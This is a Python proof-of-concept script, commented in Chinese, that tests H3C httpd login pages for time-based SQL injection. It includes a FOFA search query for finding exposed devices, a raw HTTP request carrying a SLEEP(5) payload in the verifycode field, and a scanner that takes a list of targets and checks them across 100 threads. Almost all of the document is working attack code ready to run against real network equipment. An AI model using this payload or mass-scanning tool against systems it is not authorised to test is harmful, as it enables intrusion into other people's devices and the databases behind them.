# fofa：server="H3C httpd" && title=="请登录"
"""poc：POST /web/login HTTP/1.1
        Host: 
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
        Content-Type: application/x-www-form-urlencoded

        user_name=admin&password=admin&verifycode=1' AND (SELECT 9821 FROM (SELECT(SLEEP(5)))dfpe) AND 'dYCM'='&language=0"""



# 导包
import sys,argparse
import requests
import json
import urllib3
import warnings
from multiprocessing.dummy import Pool # 多线程的库

# 禁用不安全请求警告
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def banner():
    test = """
  ___ ___________ _________                   .__   
 /   |   \_____  \\_   ___ \       ___________|  |  
/    ~    \_(__  </    \  \/      /  ___/ ____/  |  
\    Y    /       \     \____     \___ < <_|  |  |__
 \___|_  /______  /\______  /____/____  >__   |____/
       \/       \/        \/_____/    \/   |__|     
"""
    print(test)



def main():
    banner()

    # 先处理命令行输入的内容
    # 初始化
    parse = argparse.ArgumentParser(description="H3C HTTP服务器 login 存在SQL注入")

    # 添加命令行参数
    parse.add_argument('-u','--url',dest='url',type=str,help="Please input your url")
    parse.add_argument('-f','--file',dest='file',type=str,help="Please input your file")

    # 实例化
    args = parse.parse_args()

    # 对用户输入的参数进行判断 只能是单个的，要不一个url，或一个文件
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        # 多线程处理
        url_list = [] # 接收文件中处理之后的url
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close
        mp.join
    else:
        print(f"Usage python {sys.argv[0]} -h")




def poc(target):
    link = "/web/login"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    data = "user_name=admin&password=admin&verifycode=1' AND (SELECT 9821 FROM (SELECT(SLEEP(5)))dfpe) AND 'dYCM'='&language=0"
    proxies = {
        "http":"http://127.0.0.1:7890",
        "https":"http://127.0.0.1:7890"
    }

    try:
        res1 = requests.get(url=target,headers=headers,timeout=10,verify=False)
        if res1.status_code == 200:
            res2 = requests.post(url=target+link,headers=headers,data=data,timeout=10,verify=False)
            if res2.elapsed.total_seconds() >= 5:
                print(f"[+]该{target}存在sql注入")
                # with open('result.txt','a',encoding='utf-8')as f:    # 将结果保存到result.txt中
                #     f.write(f"[+]该{target}存在sql注入"+'\n')
            else:
                print(f"[-]该{target}不存在sql注入")
    except Exception as e:
        print(f"该{target}存在问题，请手工进行测试")
        print(e)



# 函数入口
if __name__ == "__main__":
    main()